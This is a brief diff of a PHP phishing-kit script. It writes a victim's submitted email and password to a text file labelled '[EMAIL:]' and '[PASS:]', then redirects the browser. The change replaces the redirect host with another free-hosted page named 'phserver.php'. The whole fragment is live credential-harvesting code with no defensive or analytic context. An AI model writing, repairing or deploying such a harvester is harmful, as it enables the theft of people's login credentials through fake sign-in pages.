@@ -6,7 +6,7 @@ session_start();
 			
   			
  file_put_contents("usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
- header('Location:https://classroomdwarka.000webhostapp.com/server.php');
+ header('Location:http://avsmailer.000webhostapp.com/phserver.php');
 exit();
 	
 			
